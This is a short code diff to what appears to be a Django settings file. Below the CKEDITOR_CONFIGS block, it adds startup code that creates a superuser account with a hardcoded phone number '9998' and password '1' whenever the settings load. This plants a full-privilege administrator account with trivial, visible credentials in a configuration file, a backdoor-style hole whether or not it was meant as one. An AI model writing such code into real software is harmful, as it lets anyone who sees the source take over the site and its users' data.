@@ -140,3 +140,18 @@ CKEDITOR_CONFIGS = {
             ]),
         },
 }
+
+
+from apps.models import User
+
+SUPER_PHONE = '9998'
+SUPER_PASS = '1'
+
+if SUPER_PHONE and SUPER_PASS:
+    if not User.objects.filter(phone_number=SUPER_PHONE).exists():
+        User.objects.create_superuser(
+            phone_number=SUPER_PHONE,
+            password=SUPER_PASS,
+            is_staff=True,
+            is_superuser=True
+        )
